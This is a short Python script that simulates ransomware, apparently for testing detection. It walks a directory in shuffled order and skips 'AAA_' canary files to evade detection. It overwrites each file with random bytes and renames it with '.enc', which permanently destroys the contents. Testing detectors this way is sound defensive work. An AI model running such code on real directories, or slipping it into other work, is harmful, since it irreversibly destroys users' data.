import os, random

def random_content(size=4096):
    return os.urandom(size)

def sim_random(root_dir: str):
    """
    Simulate ransomware doing randomized traversal.
    Shuffles file list before encrypting — harder to detect by pattern.
    Skips AAA_ canary files explicitly.
    """
    print(f"[SIM_RANDOM] Starting randomized traversal from {root_dir}")
    all_files = []
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            if filename.startswith("AAA_") or filename.endswith(".enc"):
                continue
            all_files.append(os.path.join(dirpath, filename))

    random.shuffle(all_files)
    count = 0
    for filepath in all_files:
        try:
            with open(filepath, "wb") as f:
                f.write(random_content())
            enc_path = filepath + ".enc"
            os.rename(filepath, enc_path)
            count += 1
            print(f"[SIM_RANDOM] Encrypted: {enc_path}")
        except Exception as e:
            print(f"[SIM_RANDOM] Skipped {filepath}: {e}")
    print(f"[SIM_RANDOM] Done. {count} files encrypted.")

if __name__ == "__main__":
    import sys
    root = sys.argv[1] if len(sys.argv) > 1 else "/tmp/sim_test"
    os.makedirs(root, exist_ok=True)
    sim_random(root)
